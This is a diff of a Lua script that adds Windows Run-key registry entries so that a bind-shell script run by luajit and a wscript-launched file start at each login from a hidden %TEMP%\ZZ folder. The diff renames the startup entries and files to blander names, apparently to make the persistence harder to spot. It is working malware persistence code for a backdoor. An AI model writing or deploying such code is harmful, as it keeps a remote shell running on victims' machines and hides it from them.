@@ -78,18 +78,18 @@ function writeRegistryValue(key, subKey, valueName, valueData)
 end
 
 -- Example usage to write file paths to the registry to run at startup
-local bindShellPath = [[%TEMP%\ZZ\Luapath\luajit.exe %TEMP%\ZZ\bindshell.lua]]
-local vbsPath = [[wscript.exe "%TEMP%\ZZ\win.vbs"]]
+local bindShellPath = [[%TEMP%\ZZ\Luapath\luajit.exe %TEMP%\ZZ\bin.cmd]]
+local vbsPath = [[wscript.exe "%TEMP%\ZZ\win.cmd"]]
 
-local successBindShell = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "BindShellStartup", bindShellPath)
-local successVbs = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "VBSStartup", vbsPath)
+local successBindShell = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "BinStartup", bindShellPath)
+local successVbs = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "cmdStartup", vbsPath)
 
 if successBindShell and successVbs then
     print("Successfully wrote both registry values.")
 elseif successBindShell then
-    print("Successfully wrote the registry value for BindShellStartup but failed for VBSStartup.")
+    print("Successfully wrote the registry value for BindShellStartup but failed for winStartup.")
 elseif successVbs then
-    print("Successfully wrote the registry value for VBSStartup but failed for BindShellStartup.")
+    print("Successfully wrote the registry value for VBSStartup but failed for BinStartup.")
 else
     print("Failed to write both registry values.")
 end
